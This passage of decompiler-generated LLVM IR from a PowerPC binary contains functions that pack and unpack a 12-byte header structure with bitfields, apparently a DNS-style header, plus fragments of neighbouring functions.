  %v2_1000c7a4 = phi i32 [ %v2_1000c6d851, %dec_label_pc_1000c78c ], [ %v2_1000c754, %dec_label_pc_1000c74c ]
  %v0_1000c794 = phi i32 [ %v0_1000c6b4, %dec_label_pc_1000c78c ], [ %v0_1000c794.pre, %dec_label_pc_1000c74c ]
  %v1_1000c794 = load i32, i32* @r30, align 4
  %v2_1000c794 = add i32 %v1_1000c794, %v0_1000c794
  %v1_1000c798 = icmp slt i32 %v2_1000c794, 8
  %v3_1000c798 = icmp eq i32 %v2_1000c794, 8
  store i1 %v1_1000c798, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c798, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c798, label %dec_label_pc_1000c7a0, label %dec_label_pc_1000c7ac

dec_label_pc_1000c7a0:                            ; preds = %dec_label_pc_1000c794
  %v3_1000c7a4 = inttoptr i32 %v2_1000c7a4 to i8*
  store i8 58, i8* %v3_1000c7a4, align 1
  %v0_1000c7a8 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c7a8 = add i32 %v0_1000c7a8, 1
  store i32 %v1_1000c7a8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c7ac

dec_label_pc_1000c7ac:                            ; preds = %dec_label_pc_1000c794, %dec_label_pc_1000c78c, %dec_label_pc_1000c7a0
  %v2_1000c7c0 = phi i32 [ %v2_1000c7a4, %dec_label_pc_1000c794 ], [ %v2_1000c6d851, %dec_label_pc_1000c78c ], [ %v1_1000c7a8, %dec_label_pc_1000c7a0 ]
  %v1_1000c7ac = sub i32 1, %v2_1000c6a8
  %v2_1000c7b4 = add i32 %v1_1000c7ac, %v2_1000c7c0
  %v1_1000c7b8 = load i32, i32* @r26, align 4
  %v2_1000c7b8 = icmp ult i32 %v2_1000c7b4, %v1_1000c7b8
  %v4_1000c7b8 = icmp eq i32 %v2_1000c7b4, %v1_1000c7b8
  store i1 %v2_1000c7b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c7b8, i1* %cr7_eq.global-to-local, align 1
  %v3_1000c7c0 = inttoptr i32 %v2_1000c7c0 to i8*
  store i8 0, i8* %v3_1000c7c0, align 1
  %v0_1000c7c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c7c4 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000c7c4 = or i1 %v0_1000c7c4, %v1_1000c7c4
  br i1 %v2_1000c7c4, label %dec_label_pc_1000c7dc, label %dec_label_pc_1000c7c8

dec_label_pc_1000c7c8:                            ; preds = %dec_label_pc_1000c7ac
  %v0_1000c7c8 = call i32 @function_10004e38()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c7d4 = inttoptr i32 %v0_1000c7c8 to i32*
  store i32 28, i32* %v2_1000c7d4, align 4
  %v0_1000c800.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c7fc

dec_label_pc_1000c7dc:                            ; preds = %dec_label_pc_1000c7ac
  %v0_1000c7dc = load i32, i32* @r25, align 4
  %v2_1000c7e0 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000c7e0 = call i32 @function_10007268(i32 %v0_1000c7dc, i8* %v2_1000c7e0)
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c5a0, %dec_label_pc_1000c7dc
  %storemerge1 = phi i32 [ %v3_1000c5ac, %dec_label_pc_1000c5a0 ], [ %v3_1000c7e0, %dec_label_pc_1000c7dc ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c7fc

dec_label_pc_1000c7ec:                            ; preds = %dec_label_pc_1000c594
  %v0_1000c7ec = call i32 @function_10004e38()
  %v2_1000c7f4 = inttoptr i32 %v0_1000c7ec to i32*
  store i32 97, i32* %v2_1000c7f4, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c7fc

dec_label_pc_1000c7fc:                            ; preds = %dec_label_pc_1000c72c, %dec_label_pc_1000c7e4, %dec_label_pc_1000c7c8, %dec_label_pc_1000c7ec
  %v0_1000c800 = phi i32 [ 0, %dec_label_pc_1000c72c ], [ %storemerge1, %dec_label_pc_1000c7e4 ], [ %v0_1000c800.pre, %dec_label_pc_1000c7c8 ], [ 0, %dec_label_pc_1000c7ec ]
  ret i32 %v0_1000c800

; uselistorder directives
  uselistorder i32 %v2_1000c7c0, { 1, 0 }
  uselistorder i32 %v2_1000c794, { 1, 0 }
  uselistorder i1 %v3_1000c6b4, { 0, 2, 1 }
  uselistorder i32 %v0_1000c6b4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000c780, { 2, 1, 0 }
  uselistorder i32 %v0_1000c73866, { 1, 0 }
  uselistorder i32 %v3_1000c73c, { 1, 0 }
  uselistorder i32 %v0_1000c708, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000c6f8.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000c6f4, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000c6c4, { 1, 0 }
  uselistorder i32 %v0_1000c6e4, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000c6c4, { 0, 2, 1 }
  uselistorder i32 %v2_1000c6f0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000c6b43, { 0, 2, 1 }
  uselistorder i32 %v0_1000c69c, { 2, 1, 0 }
  uselistorder i32 %v0_1000c68c.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000c694, { 1, 0, 2 }
  uselistorder i32 %v1_1000c670, { 2, 1, 0 }
  uselistorder i32 %v1_1000c66c, { 1, 0 }
  uselistorder i32 %v0_1000c65039, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000c66042, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000c624, { 1, 0 }
  uselistorder i32 %v0_1000c66c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000c624, { 1, 0 }
  uselistorder i32 %v0_1000c650, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000c660, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000c600, { 1, 0 }
  uselistorder i32 %v2_1000c5f8, { 1, 0 }
  uselistorder i32 %v0_1000c5f0, { 1, 0, 2 }
  uselistorder i32 %v1_1000c5d8, { 1, 0 }
  uselistorder i32 %v2_1000c5b4, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 (i32, i8*)* @function_10007268, { 0, 1, 4, 5, 6, 7, 2, 3, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10004fac, { 1, 0 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 5, 0, 6, 10, 11, 7, 8, 9, 12 }
  uselistorder i1 true, { 3, 0, 4, 5, 1, 2 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_100071a4, { 15, 14, 9, 2, 8, 7, 4, 0, 1, 3, 13, 12, 11, 10, 6, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000c410, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c7fc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c7e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c780, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c75c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000c6b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c68c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c66c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c668, { 1, 0 }
  uselistorder label %dec_label_pc_1000c620, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5d8, { 1, 0 }
}

define i32 @function_1000c814(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c814:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000c8f8, label %dec_label_pc_1000c820

dec_label_pc_1000c820:                            ; preds = %dec_label_pc_1000c814
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000c820 = add i32 %tmp, 2
  %v2_1000c820 = inttoptr i32 %v1_1000c820 to i8*
  %v3_1000c820 = load i8, i8* %v2_1000c820, align 1
  %v4_1000c820 = zext i8 %v3_1000c820 to i32
  store i32 %v4_1000c820, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_1000c820, i8* %tmp3, align 1
  %v2_1000c82c = load i32, i32* %arg1, align 4
  store i32 %v2_1000c82c, i32* %r0.global-to-local, align 4
  %v1_1000c830 = trunc i32 %v2_1000c82c to i8
  %v4_1000c830 = add i32 %arg2, 1
  %v5_1000c830 = inttoptr i32 %v4_1000c830 to i8*
  store i8 %v1_1000c830, i8* %v5_1000c830, align 1
  %v1_1000c834 = add i32 %tmp, 12
  %v2_1000c834 = inttoptr i32 %v1_1000c834 to i32*
  %v3_1000c834 = load i32, i32* %v2_1000c834, align 4
  store i32 %v3_1000c834, i32* %r0.global-to-local, align 4
  %v1_1000c838 = add i32 %tmp, 16
  %v2_1000c838 = inttoptr i32 %v1_1000c838 to i32*
  %v3_1000c838 = load i32, i32* %v2_1000c838, align 4
  store i32 %v3_1000c838, i32* %r11.global-to-local, align 4
  %v1_1000c83c = add i32 %tmp, 4
  %v2_1000c83c = inttoptr i32 %v1_1000c83c to i32*
  %v3_1000c83c = load i32, i32* %v2_1000c83c, align 4
  %v2_1000c840 = icmp ne i32 %v3_1000c834, 0
  %v5_1000c844 = zext i1 %v2_1000c840 to i32
  store i32 %v5_1000c844, i32* %r10.global-to-local, align 4
  %v1_1000c848 = add i32 %tmp, 8
  %v2_1000c848 = inttoptr i32 %v1_1000c848 to i32*
  %v3_1000c848 = load i32, i32* %v2_1000c848, align 4
  %v2_1000c84c = icmp ne i32 %v3_1000c838, 0
  %v5_1000c850 = zext i1 %v2_1000c84c to i32
  %v1_1000c854 = add i32 %tmp, 20
  %v2_1000c854 = inttoptr i32 %v1_1000c854 to i32*
  %v3_1000c854 = load i32, i32* %v2_1000c854, align 4
  store i32 %v3_1000c854, i32* %r0.global-to-local, align 4
  %not.v2_1000c858 = icmp eq i32 %v3_1000c83c, 0
  %v6_1000c85c = sext i1 %not.v2_1000c858 to i32
  store i32 %v5_1000c850, i32* %r11.global-to-local, align 4
  %v1_1000c864 = call i32 @__asm_rlwinm(i32 %v6_1000c85c, i32 0, i32 24, i32 24)
  %v0_1000c868 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c868 = mul i32 %v0_1000c868, 4
  store i32 %v1_1000c868, i32* %r10.global-to-local, align 4
  %v1_1000c86c = call i32 @__asm_rlwinm(i32 %v3_1000c848, i32 3, i32 25, i32 28)
  %v0_1000c870 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c870 = icmp ne i32 %v0_1000c870, 0
  %v5_1000c874 = zext i1 %v2_1000c870 to i32
  %v2_1000c878 = or i32 %v1_1000c868, %v1_1000c86c
  store i32 %v2_1000c878, i32* %r10.global-to-local, align 4
  %v1_1000c87c = add i32 %v1_1000c864, 128
  %v0_1000c880 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c880 = mul i32 %v0_1000c880, 2
  store i32 %v1_1000c880, i32* %r11.global-to-local, align 4
  %v2_1000c884 = or i32 %v2_1000c878, %v5_1000c874
  store i32 %v2_1000c884, i32* %r0.global-to-local, align 4
  %v2_1000c888 = or i32 %v2_1000c884, %v1_1000c87c
  %v2_1000c88c = or i32 %v2_1000c888, %v1_1000c880
  %v1_1000c890 = trunc i32 %v2_1000c88c to i8
  %v4_1000c890 = add i32 %arg2, 2
  %v5_1000c890 = inttoptr i32 %v4_1000c890 to i8*
  store i8 %v1_1000c890, i8* %v5_1000c890, align 1
  %v1_1000c894 = add i32 %tmp, 24
  %v2_1000c894 = inttoptr i32 %v1_1000c894 to i32*
  %v3_1000c894 = load i32, i32* %v2_1000c894, align 4
  %v1_1000c898 = add i32 %tmp, 28
  %v2_1000c898 = inttoptr i32 %v1_1000c898 to i32*
  %v3_1000c898 = load i32, i32* %v2_1000c898, align 4
  store i32 %v3_1000c898, i32* %r0.global-to-local, align 4
  %not.v2_1000c89c = icmp eq i32 %v3_1000c894, 0
  %v6_1000c8a0 = sext i1 %not.v2_1000c89c to i32
  %v1_1000c8a4 = call i32 @__asm_rlwinm(i32 %v6_1000c8a0, i32 0, i32 24, i32 24)
  %v1_1000c8a8 = urem i32 %v3_1000c898, 16
  store i32 %v1_1000c8a8, i32* %r0.global-to-local, align 4
  %v1_1000c8ac = add i32 %v1_1000c8a4, 128
  %v2_1000c8b0 = or i32 %v1_1000c8a8, %v1_1000c8ac
  %v1_1000c8b4 = trunc i32 %v2_1000c8b0 to i8
  %v4_1000c8b4 = add i32 %arg2, 3
  %v5_1000c8b4 = inttoptr i32 %v4_1000c8b4 to i8*
  store i8 %v1_1000c8b4, i8* %v5_1000c8b4, align 1
  %v1_1000c8b8 = add i32 %tmp, 34
  %v2_1000c8b8 = inttoptr i32 %v1_1000c8b8 to i8*
  %v3_1000c8b8 = load i8, i8* %v2_1000c8b8, align 1
  %v4_1000c8b8 = zext i8 %v3_1000c8b8 to i32
  store i32 %v4_1000c8b8, i32* %r0.global-to-local, align 4
  %v4_1000c8bc = add i32 %arg2, 4
  %v5_1000c8bc = inttoptr i32 %v4_1000c8bc to i8*
  store i8 %v3_1000c8b8, i8* %v5_1000c8bc, align 1
  %v1_1000c8c0 = add i32 %tmp, 32
  %v2_1000c8c0 = inttoptr i32 %v1_1000c8c0 to i32*
  %v3_1000c8c0 = load i32, i32* %v2_1000c8c0, align 4
  store i32 %v3_1000c8c0, i32* %r0.global-to-local, align 4
  %v1_1000c8c4 = trunc i32 %v3_1000c8c0 to i8
  %v4_1000c8c4 = add i32 %arg2, 5
  %v5_1000c8c4 = inttoptr i32 %v4_1000c8c4 to i8*
  store i8 %v1_1000c8c4, i8* %v5_1000c8c4, align 1
  %v1_1000c8c8 = add i32 %tmp, 38
  %v2_1000c8c8 = inttoptr i32 %v1_1000c8c8 to i8*
  %v3_1000c8c8 = load i8, i8* %v2_1000c8c8, align 1
  %v4_1000c8c8 = zext i8 %v3_1000c8c8 to i32
  store i32 %v4_1000c8c8, i32* %r0.global-to-local, align 4
  %v4_1000c8cc = add i32 %arg2, 6
  %v5_1000c8cc = inttoptr i32 %v4_1000c8cc to i8*
  store i8 %v3_1000c8c8, i8* %v5_1000c8cc, align 1
  %v1_1000c8d0 = add i32 %tmp, 36
  %v2_1000c8d0 = inttoptr i32 %v1_1000c8d0 to i32*
  %v3_1000c8d0 = load i32, i32* %v2_1000c8d0, align 4
  store i32 %v3_1000c8d0, i32* %r0.global-to-local, align 4
  %v1_1000c8d4 = trunc i32 %v3_1000c8d0 to i8
  %v4_1000c8d4 = add i32 %arg2, 7
  %v5_1000c8d4 = inttoptr i32 %v4_1000c8d4 to i8*
  store i8 %v1_1000c8d4, i8* %v5_1000c8d4, align 1
  %v1_1000c8d8 = add i32 %tmp, 42
  %v2_1000c8d8 = inttoptr i32 %v1_1000c8d8 to i8*
  %v3_1000c8d8 = load i8, i8* %v2_1000c8d8, align 1
  %v4_1000c8d8 = zext i8 %v3_1000c8d8 to i32
  store i32 %v4_1000c8d8, i32* %r0.global-to-local, align 4
  %v4_1000c8dc = add i32 %arg2, 8
  %v5_1000c8dc = inttoptr i32 %v4_1000c8dc to i8*
  store i8 %v3_1000c8d8, i8* %v5_1000c8dc, align 1
  %v1_1000c8e0 = add i32 %tmp, 40
  %v2_1000c8e0 = inttoptr i32 %v1_1000c8e0 to i32*
  %v3_1000c8e0 = load i32, i32* %v2_1000c8e0, align 4
  store i32 %v3_1000c8e0, i32* %r0.global-to-local, align 4
  %v1_1000c8e4 = trunc i32 %v3_1000c8e0 to i8
  %v4_1000c8e4 = add i32 %arg2, 9
  %v5_1000c8e4 = inttoptr i32 %v4_1000c8e4 to i8*
  store i8 %v1_1000c8e4, i8* %v5_1000c8e4, align 1
  %v1_1000c8e8 = add i32 %tmp, 46
  %v2_1000c8e8 = inttoptr i32 %v1_1000c8e8 to i8*
  %v3_1000c8e8 = load i8, i8* %v2_1000c8e8, align 1
  %v4_1000c8e8 = zext i8 %v3_1000c8e8 to i32
  store i32 %v4_1000c8e8, i32* %r0.global-to-local, align 4
  %v4_1000c8ec = add i32 %arg2, 10
  %v5_1000c8ec = inttoptr i32 %v4_1000c8ec to i8*
  store i8 %v3_1000c8e8, i8* %v5_1000c8ec, align 1
  %v1_1000c8f0 = add i32 %tmp, 44
  %v2_1000c8f0 = inttoptr i32 %v1_1000c8f0 to i32*
  %v3_1000c8f0 = load i32, i32* %v2_1000c8f0, align 4
  store i32 %v3_1000c8f0, i32* %r0.global-to-local, align 4
  %v1_1000c8f4 = trunc i32 %v3_1000c8f0 to i8
  %v4_1000c8f4 = add i32 %arg2, 11
  %v5_1000c8f4 = inttoptr i32 %v4_1000c8f4 to i8*
  store i8 %v1_1000c8f4, i8* %v5_1000c8f4, align 1
  %v0_1000c8f8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000c8f8

dec_label_pc_1000c8f8:                            ; preds = %dec_label_pc_1000c814, %dec_label_pc_1000c820
  %v0_1000c8f8 = phi i32 [ -1, %dec_label_pc_1000c814 ], [ %v0_1000c8f8.pre, %dec_label_pc_1000c820 ]
  ret i32 %v0_1000c8f8

; uselistorder directives
  uselistorder i32 %v1_1000c8a8, { 1, 0 }
  uselistorder i32 %v1_1000c880, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder label %dec_label_pc_1000c8f8, { 1, 0 }
}

define i32 @function_1000c900(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c900:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000c900 = load i8, i8* %arg1, align 1
  %v4_1000c900 = zext i8 %v3_1000c900 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000c908 = add i32 %tmp, 1
  %v3_1000c908 = inttoptr i32 %v2_1000c908 to i8*
  %v4_1000c908 = load i8, i8* %v3_1000c908, align 1
  %v5_1000c908 = zext i8 %v4_1000c908 to i32
  %v1_1000c910 = mul nuw nsw i32 %v4_1000c900, 256
  %v2_1000c914 = or i32 %v5_1000c908, %v1_1000c910
  %v2_1000c918 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000c914, i32* %v2_1000c918, align 4
  %v0_1000c91c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c91c = add i32 %v0_1000c91c, 2
  %v2_1000c91c = inttoptr i32 %v1_1000c91c to i8*
  %v3_1000c91c = load i8, i8* %v2_1000c91c, align 1
  %v4_1000c91c = zext i8 %v3_1000c91c to i32
  %v1_1000c920 = call i32 @__asm_rlwinm(i32 %v4_1000c91c, i32 25, i32 31, i32 31)
  %v2_1000c924 = add i32 %arg2, 4
  %v3_1000c924 = inttoptr i32 %v2_1000c924 to i32*
  store i32 %v1_1000c920, i32* %v3_1000c924, align 4
  %v0_1000c928 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c928 = add i32 %v0_1000c928, 2
  %v2_1000c928 = inttoptr i32 %v1_1000c928 to i8*
  %v3_1000c928 = load i8, i8* %v2_1000c928, align 1
  %v4_1000c928 = zext i8 %v3_1000c928 to i32
  %v1_1000c92c = call i32 @__asm_rlwinm(i32 %v4_1000c928, i32 29, i32 28, i32 31)
  %v2_1000c930 = add i32 %arg2, 8
  %v3_1000c930 = inttoptr i32 %v2_1000c930 to i32*
  store i32 %v1_1000c92c, i32* %v3_1000c930, align 4
  %v0_1000c934 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c934 = add i32 %v0_1000c934, 2
  %v2_1000c934 = inttoptr i32 %v1_1000c934 to i8*
  %v3_1000c934 = load i8, i8* %v2_1000c934, align 1
  %v4_1000c934 = zext i8 %v3_1000c934 to i32
  %v1_1000c938 = call i32 @__asm_rlwinm(i32 %v4_1000c934, i32 30, i32 31, i32 31)
  %v2_1000c93c = add i32 %arg2, 12
  %v3_1000c93c = inttoptr i32 %v2_1000c93c to i32*
  store i32 %v1_1000c938, i32* %v3_1000c93c, align 4
  %v0_1000c940 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c940 = add i32 %v0_1000c940, 2
  %v2_1000c940 = inttoptr i32 %v1_1000c940 to i8*
  %v3_1000c940 = load i8, i8* %v2_1000c940, align 1
  %v4_1000c940 = zext i8 %v3_1000c940 to i32
  %v1_1000c944 = call i32 @__asm_rlwinm(i32 %v4_1000c940, i32 31, i32 31, i32 31)
  %v2_1000c948 = add i32 %arg2, 16
  %v3_1000c948 = inttoptr i32 %v2_1000c948 to i32*
  store i32 %v1_1000c944, i32* %v3_1000c948, align 4
  %v0_1000c94c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c94c = add i32 %v0_1000c94c, 2
  %v2_1000c94c = inttoptr i32 %v1_1000c94c to i8*
  %v3_1000c94c = load i8, i8* %v2_1000c94c, align 1
  %tmp1 = urem i8 %v3_1000c94c, 2
  %v1_1000c950 = zext i8 %tmp1 to i32
  %v2_1000c954 = add i32 %arg2, 20
  %v3_1000c954 = inttoptr i32 %v2_1000c954 to i32*
  store i32 %v1_1000c950, i32* %v3_1000c954, align 4
  %v0_1000c958 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c958 = add i32 %v0_1000c958, 3
  %v2_1000c958 = inttoptr i32 %v1_1000c958 to i8*
  %v3_1000c958 = load i8, i8* %v2_1000c958, align 1
  %v4_1000c958 = zext i8 %v3_1000c958 to i32
  %v1_1000c95c = call i32 @__asm_rlwinm(i32 %v4_1000c958, i32 25, i32 31, i32 31)
  %v2_1000c960 = add i32 %arg2, 24
  %v3_1000c960 = inttoptr i32 %v2_1000c960 to i32*
  store i32 %v1_1000c95c, i32* %v3_1000c960, align 4
  %v0_1000c964 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c964 = add i32 %v0_1000c964, 3
  %v2_1000c964 = inttoptr i32 %v1_1000c964 to i8*
  %v3_1000c964 = load i8, i8* %v2_1000c964, align 1
  %tmp2 = urem i8 %v3_1000c964, 16
  %v1_1000c968 = zext i8 %tmp2 to i32
  %v2_1000c96c = add i32 %arg2, 28
  %v3_1000c96c = inttoptr i32 %v2_1000c96c to i32*
  store i32 %v1_1000c968, i32* %v3_1000c96c, align 4
  %v0_1000c970 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c970 = add i32 %v0_1000c970, 4
  %v2_1000c970 = inttoptr i32 %v1_1000c970 to i8*
  %v3_1000c970 = load i8, i8* %v2_1000c970, align 1
  %v4_1000c970 = zext i8 %v3_1000c970 to i32
  %v1_1000c974 = add i32 %v0_1000c970, 5
  %v2_1000c974 = inttoptr i32 %v1_1000c974 to i8*
  %v3_1000c974 = load i8, i8* %v2_1000c974, align 1
  %v4_1000c974 = zext i8 %v3_1000c974 to i32
  %v1_1000c978 = mul nuw nsw i32 %v4_1000c970, 256
  %v2_1000c97c = or i32 %v4_1000c974, %v1_1000c978
  %v2_1000c980 = add i32 %arg2, 32
  %v3_1000c980 = inttoptr i32 %v2_1000c980 to i32*
  store i32 %v2_1000c97c, i32* %v3_1000c980, align 4
  %v0_1000c984 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c984 = add i32 %v0_1000c984, 6
  %v2_1000c984 = inttoptr i32 %v1_1000c984 to i8*
  %v3_1000c984 = load i8, i8* %v2_1000c984, align 1
  %v4_1000c984 = zext i8 %v3_1000c984 to i32
  %v1_1000c988 = add i32 %v0_1000c984, 7
  %v2_1000c988 = inttoptr i32 %v1_1000c988 to i8*
  %v3_1000c988 = load i8, i8* %v2_1000c988, align 1
  %v4_1000c988 = zext i8 %v3_1000c988 to i32
  %v1_1000c98c = mul nuw nsw i32 %v4_1000c984, 256
  %v2_1000c990 = or i32 %v4_1000c988, %v1_1000c98c
  %v2_1000c994 = add i32 %arg2, 36
  %v3_1000c994 = inttoptr i32 %v2_1000c994 to i32*
  store i32 %v2_1000c990, i32* %v3_1000c994, align 4
  %v0_1000c998 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c998 = add i32 %v0_1000c998, 8
  %v2_1000c998 = inttoptr i32 %v1_1000c998 to i8*
  %v3_1000c998 = load i8, i8* %v2_1000c998, align 1
  %v4_1000c998 = zext i8 %v3_1000c998 to i32
  %v1_1000c99c = add i32 %v0_1000c998, 9
  %v2_1000c99c = inttoptr i32 %v1_1000c99c to i8*
  %v3_1000c99c = load i8, i8* %v2_1000c99c, align 1
  %v4_1000c99c = zext i8 %v3_1000c99c to i32
  %v1_1000c9a0 = mul nuw nsw i32 %v4_1000c998, 256
  %v2_1000c9a4 = or i32 %v4_1000c99c, %v1_1000c9a0
  %v2_1000c9a8 = add i32 %arg2, 40
  %v3_1000c9a8 = inttoptr i32 %v2_1000c9a8 to i32*
  store i32 %v2_1000c9a4, i32* %v3_1000c9a8, align 4
  %v0_1000c9ac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c9ac = add i32 %v0_1000c9ac, 10
  %v2_1000c9ac = inttoptr i32 %v1_1000c9ac to i8*
  %v3_1000c9ac = load i8, i8* %v2_1000c9ac, align 1
  %v4_1000c9ac = zext i8 %v3_1000c9ac to i32
  %v1_1000c9b0 = add i32 %v0_1000c9ac, 11
  %v2_1000c9b0 = inttoptr i32 %v1_1000c9b0 to i8*
  %v3_1000c9b0 = load i8, i8* %v2_1000c9b0, align 1
  %v4_1000c9b0 = zext i8 %v3_1000c9b0 to i32
  store i32 %v4_1000c9b0, i32* %r9.global-to-local, align 4
  %v1_1000c9b4 = mul nuw nsw i32 %v4_1000c9ac, 256
  %v2_1000c9b8 = or i32 %v4_1000c9b0, %v1_1000c9b4
  %v2_1000c9bc = add i32 %arg2, 44
  %v3_1000c9bc = inttoptr i32 %v2_1000c9bc to i32*
  store i32 %v2_1000c9b8, i32* %v3_1000c9bc, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 2, 3, 7, 8, 9, 1, 6, 4, 0, 5 }
  uselistorder i32 11, { 8, 9, 11, 10, 4, 3, 12, 0, 1, 13, 14, 15, 16, 17, 2, 5, 6, 7 }
  uselistorder i32 40, { 4, 5, 8, 6, 7, 0, 9, 10, 11, 12, 13, 3, 2, 1 }
  uselistorder i32 7, { 9, 10, 1, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 8, 11, 0 }
  uselistorder i32 5, { 18, 19, 12, 13, 14, 4, 5, 15, 1, 16, 17, 3, 2, 20, 21, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 28, { 15, 16, 17, 18, 2, 3, 6, 28, 32, 44, 19, 0, 20, 21, 22, 4, 5, 33, 12, 7, 14, 23, 29, 30, 24, 25, 34, 35, 36, 37, 38, 39, 42, 40, 41, 1, 43, 45, 31, 8, 9, 10, 11, 13, 26, 27 }
  uselistorder i32 29, { 8, 0, 1, 16, 17, 6, 7, 9, 10, 11, 12, 15, 2, 13, 3, 14, 20, 21, 18, 19, 4, 5 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @function_1000c9c4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c9c4:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000c9e0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c9e0, i32* %r3.global-to-local, align 4
  store i32 268487144, i32* @lr, align 4
  %v1_1000c9e4 = inttoptr i32 %v2_1000c9e0 to i8*
  %v2_1000c9e4 = call i32 @function_1000d114(i8* %v1_1000c9e4)
  store i32 %v2_1000c9e4, i32* %r3.global-to-local, align 4
  %v1_1000c9e8 = icmp slt i32 %v2_1000c9e4, 0
  %v1_1000c9ec = load i32, i32* @r29, align 4
  %v2_1000c9ec = sub i32 %v1_1000c9ec, %v2_1000c9e4
